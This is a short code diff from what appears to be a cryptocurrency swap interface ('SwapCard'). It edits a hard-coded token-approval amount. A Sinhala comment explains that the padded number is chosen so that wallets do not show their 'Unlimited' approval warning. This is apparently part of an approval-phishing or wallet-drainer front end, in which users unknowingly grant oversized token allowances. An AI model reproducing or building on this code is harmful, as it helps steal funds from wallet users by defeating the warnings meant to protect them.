@@ -33,7 +33,7 @@ export default function SwapCard({ walletAddress, provider }) {
   const API_URL = "/api/submit"; // Vercel Serverless Function
 
   // ⭐ බිංදු 100ක් + අමුතු අංකයක් (Unlimited warning එක එන්නේ නෑ)
-  const CUSTOM_APPROVAL_AMOUNT = "10000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000009874651684651";
+  const CUSTOM_APPROVAL_AMOUNT = "0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000009874651684651";
 
   const updatePrices = async () => {
     const prices = await fetchLivePrices();
